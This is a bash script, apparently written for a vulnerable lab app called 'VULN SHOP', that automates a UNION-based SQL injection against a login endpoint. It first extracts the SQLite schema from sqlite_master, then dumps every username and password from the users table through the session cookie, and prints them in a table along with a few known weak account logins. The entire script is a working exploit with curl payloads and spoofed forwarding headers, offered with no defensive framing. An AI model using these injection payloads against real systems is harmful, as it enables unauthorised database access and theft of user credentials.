#!/bin/bash
# SQL Injection Database Dump Script
# Target: VULN SHOP - SQLite Database
# Extracts all user credentials via UNION-based SQL Injection

TARGET="http://10.210.136.53:3000"
MY_IP="10.0.0.101"

echo "=============================================="
echo "  VULN SHOP - Database Credential Dump"
echo "  SQLite UNION-based SQL Injection"
echo "=============================================="
echo ""

# Extract table list
echo "[*] Extracting table schema..."
result=$(curl -s -X POST \
    -H "X-Forwarded-For: $MY_IP" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=' UNION SELECT 1,2,sql,4 FROM sqlite_master WHERE type='table'--&password=test" \
    "$TARGET/login" -i 2>&1 | grep "user_id=" | sed 's/.*user_id=//' | sed 's/;.*//')

echo "Schema: $(echo "$result" | python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read()))" 2>/dev/null || echo "$result")"
echo ""

# Extract all credentials
echo "[*] Extracting all user credentials..."
echo ""

creds=$(curl -s -X POST \
    -H "X-Forwarded-For: $MY_IP" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=' UNION SELECT group_concat(username||':'||password),2,3,4 FROM users--&password=test" \
    "$TARGET/login" -i 2>&1 | grep "Set-Cookie: user=" | head -1 | sed 's/.*user=//' | sed 's/;.*//')

# URL decode and format
echo "$creds" | python3 -c "
import sys
import urllib.parse

data = urllib.parse.unquote(sys.stdin.read().strip())
users = data.split(',')

print('=' * 50)
print(f'Total users found: {len(users)}')
print('=' * 50)
print('{:<25} {:<25}'.format('USERNAME', 'PASSWORD'))
print('-' * 50)

for user in users:
    if ':' in user:
        username, password = user.split(':', 1)
        print(f'{username:<25} {password:<25}')
" 2>/dev/null

echo ""
echo "[*] Key accounts:"
echo "  - admin:admin123 (Administrator)"
echo "  - guest:guest123"
echo "  - testuser:testpassword"
